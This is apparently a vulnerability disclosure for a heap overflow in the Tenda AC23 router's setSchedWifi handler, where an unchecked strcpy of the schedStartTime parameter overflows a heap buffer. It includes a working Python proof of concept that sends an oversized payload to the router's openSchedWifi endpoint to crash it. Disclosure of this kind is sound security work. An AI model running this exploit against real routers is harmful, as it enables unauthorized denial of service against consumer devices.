Shenzhen Jixiang Tengda Technology Co., Ltd. - Tenda AC23 setSchedWifi Heap Overflow VulnerabilityIn the function setSchedWifi, the program passes the content fetched from the parameter "schedStartTime" to the heap block ptr created by the program, and then directly copies the value of schedStartTime to the heap ptr using the strcpy function. There is no size check, which results in a heap overflow vulnerability. An attacker can easily execute a denial of service attack using carefully crafted overflow data.

<img width="415" height="320" alt="image" src="https://github.com/user-attachments/assets/abdc36c6-571a-4fbc-86ae-581d973aa1b7" />


POC：
```
from pwn import *
import requests

payload = b'a'*0x1000

url = "http://192.168.100.254/goform/openSchedWifi"

cookie = {"Cookie":"password=12345"}
data = {"schedStartTime": payload}
response = requests.post(url, cookies=cookie, data=data)
response = requests.post(url, cookies=cookie, data=data)
print(response.text)
```
